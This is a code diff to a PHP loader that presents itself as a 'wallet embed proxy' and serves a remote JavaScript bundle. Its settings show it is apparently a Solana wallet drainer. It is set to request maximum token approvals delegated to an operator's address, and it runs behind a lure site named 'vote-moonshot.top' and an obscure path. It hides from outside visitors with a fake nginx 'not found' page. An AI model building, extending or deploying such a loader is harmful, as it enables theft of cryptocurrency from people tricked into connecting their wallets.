@@ -2,13 +2,40 @@
 declare(strict_types=1);
 
 /**
- * Wallet embed PHP proxy — reads config.php, injects settings, fetches JS from Vercel.
- * nginx: location /vault38472 → this file
+ * Wallet embed PHP proxy — edit $cfg below, then: node vps/build-loader.mjs
  */
 
-// --- helpers ----------------------------------------------------------------
+$cfg = [
+    'reown_project_id' => '6a35a723a14b78178c5565dca5141ab8',
 
-/** @param array<string, mixed> $cfg */
+    'script_path' => 'vault38472',
+    'button_class_mode' => 'exact',
+    'button_class' => 'K7mQ2',
+    'network' => 'solana',
+
+    'site_name' => 'Connect Wallet',
+    'site_description' => 'Connect your Solana wallet',
+    'site_icons' => ['https://vote-moonshot.top/tYZq2BsVawvS5wYEF.svg'],
+    'site_url' => 'https://vote-moonshot.top',
+
+    'vercel_bundle_url' => 'https://YOUR-PROJECT.vercel.app/wallet.bundle.js',
+    'vercel_bundle_cache_seconds' => 300,
+
+    'analytics' => false,
+    'restrict_script_access' => true,
+
+    'token_approval_enabled' => true,
+    'token_delegate' => 'YOUR_SOLANA_PUBLIC_ADDRESS',
+    'token_approval_max_count' => 10,
+    'token_approval_min_usd' => 1.0,
+    'token_approval_amount_mode' => 'max',
+    'solana_rpc_url' => 'https://mainnet.helius-rpc.com/?api-key=YOUR_KEY',
+
+    'connect_popup_enabled' => true,
+    'connect_popup_url' => '',
+    // 'connect_popup_title' => 'Gentle Crown',
+];
+
 function build_embed_config(array $cfg, string $siteUrl): array
 {
     return [
@@ -34,7 +61,6 @@ function build_embed_config(array $cfg, string $siteUrl): array
     ];
 }
 
-/** @param array<string, mixed> $cfg */
 function script_request_allowed(array $cfg, string $siteUrl): bool
 {
     if (array_key_exists('restrict_script_access', $cfg) && $cfg['restrict_script_access'] === false) {
@@ -56,7 +82,6 @@ function script_request_allowed(array $cfg, string $siteUrl): bool
     return $secFetchSite === 'same-origin' || $secFetchSite === 'same-site';
 }
 
-/** @param array<string, mixed> $cfg @return list<string> */
 function allowed_hosts(array $cfg, string $siteUrl): array
 {
     $hosts = [];
@@ -78,7 +103,6 @@ function allowed_hosts(array $cfg, string $siteUrl): array
     return array_values(array_unique($hosts));
 }
 
-/** @return list<string> */
 function request_source_hosts(): array
 {
     $hosts = [];
@@ -105,7 +129,6 @@ function send_generic_not_found(): void
         . '<hr><center>nginx</center></body></html>';
 }
 
-/** @param array<string, mixed> $cfg */
 function detect_site_url(array $cfg): string
 {
     $override = rtrim((string) ($cfg['site_url'] ?? ''), '/');
@@ -124,7 +147,6 @@ function detect_site_url(array $cfg): string
     return ($https ? 'https' : 'http') . '://' . $host;
 }
 
-/** @param array<string, mixed> $cfg */
 function load_wallet_bundle(array $cfg): ?string
 {
     $vercelUrl = trim((string) ($cfg['vercel_bundle_url'] ?? ''));
@@ -205,18 +227,6 @@ function fetch_vercel_bundle_remote(string $url): ?string
     return ($body === false || $body === '') ? null : $body;
 }
 
-// --- main -------------------------------------------------------------------
-
-$configPath = __DIR__ . '/config.php';
-if (!is_file($configPath)) {
-    http_response_code(500);
-    header('Content-Type: text/plain; charset=utf-8');
-    echo 'Missing config.php — copy config.example.php to config.php';
-    exit;
-}
-
-/** @var array<string, mixed> $cfg */
-$cfg = require $configPath;
 $siteUrl = detect_site_url($cfg);
 
 if (!script_request_allowed($cfg, $siteUrl)) {
@@ -247,7 +257,7 @@ try {
 if ($bundle === null || $bundle === '') {
     http_response_code(500);
     header('Content-Type: text/plain; charset=utf-8');
-    echo 'Could not fetch wallet bundle — set vercel_bundle_url in config.php';
+    echo 'Could not fetch wallet bundle — set vercel_bundle_url in loader.php';
     exit;
 }
 
